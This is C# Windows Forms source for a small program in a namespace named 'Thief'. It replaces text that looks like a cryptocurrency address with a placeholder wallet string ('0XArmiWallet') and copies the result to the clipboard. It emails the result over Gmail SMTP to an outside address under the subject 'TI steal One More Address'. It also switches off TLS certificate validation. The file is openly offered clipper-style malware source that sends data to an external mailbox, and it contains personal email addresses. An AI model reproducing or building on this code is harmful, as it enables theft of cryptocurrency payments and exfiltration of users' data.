using System.Net.Mail;
using System.Net.Security;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using System.Windows.Forms.Design.Behavior;

namespace Thief
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string body;
        private void Form1_Load(object sender, EventArgs e)
        {

        }







        static async Task SendEmail(string message)
        {
            string emailSender = "coffetimetest@gmail.com";
            string emailPassword = "";
            string emailReceiver = "arminttwat@gmail.com";

            string subject = "TI steal One More Address)";
            string body = message;
     

            MailMessage mailMessage = new MailMessage(emailSender, emailReceiver, subject, body);
            mailMessage.IsBodyHtml = true;

            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587,
                Credentials = new NetworkCredential(emailSender, emailPassword),
                EnableSsl = true,
            };

            ServicePointManager.ServerCertificateValidationCallback =
                delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
                {
                    return true;
                };

            try
            {
                await smtpClient.SendMailAsync(mailMessage);
                Console.WriteLine("Email sent successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending email: " + ex.Message);
            }
        }
        static string GetClipboardText()
        {
            try
            {
                return Clipboard.GetText();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error accessing clipboard: " + ex.Message);
                return null;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string inputText = textBox1.Text;

            if (!string.IsNullOrWhiteSpace(inputText))
            {
                Clipboard.SetText(inputText);
                MessageBox.Show("Text copied to clipboard!");
                Console.WriteLine(inputText);
                label1.Text = inputText;
                var x = ConvertString(inputText);
                richTextBox1.AppendText(x);
                SendEmail(x);
            }
            else
            {
                MessageBox.Show("Please enter text to copy.");
            }
        }

        static string ConvertString(string input)
        {
            if (input.StartsWith("0x") || input.Length>20)
            {
                return "0XArmiWallet";
            }
            else
            {
                return input;
            }
        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }

}
